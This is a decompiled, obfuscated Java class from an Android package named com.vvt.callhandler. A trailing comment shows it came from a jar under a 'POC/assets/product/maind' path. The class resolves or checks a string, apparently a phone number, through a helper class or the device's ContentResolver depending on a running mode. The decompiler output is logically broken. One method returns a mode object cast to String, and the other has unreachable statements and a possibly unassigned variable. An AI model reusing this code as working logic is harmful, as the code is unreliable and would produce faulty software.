package com.vvt.callhandler;

import android.content.ContentResolver;
import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.h.f;
import com.vvt.h.h;

public class l
{
  private Context a;
  private RunningMode b;
  
  public l(Context paramContext, RunningMode paramRunningMode)
  {
    this.a = paramContext;
    this.b = paramRunningMode;
  }
  
  public String a(String paramString)
  {
    Object localObject = this.b;
    RunningMode localRunningMode = RunningMode.FULL;
    if (localObject == localRunningMode) {}
    for (localObject = h.a(paramString);; localObject = f.b(this.a.getContentResolver(), paramString)) {
      return (String)localObject;
    }
  }
  
  public boolean b(String paramString)
  {
    Object localObject = this.b;
    RunningMode localRunningMode = RunningMode.FULL;
    boolean bool;
    if (localObject == localRunningMode)
    {
      localObject = h.a(paramString);
      if (localObject != null) {
        bool = true;
      }
    }
    for (;;)
    {
      return bool;
      bool = false;
      localObject = null;
      continue;
      localObject = this.a.getContentResolver();
      bool = f.a((ContentResolver)localObject, paramString);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callhandler/l.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */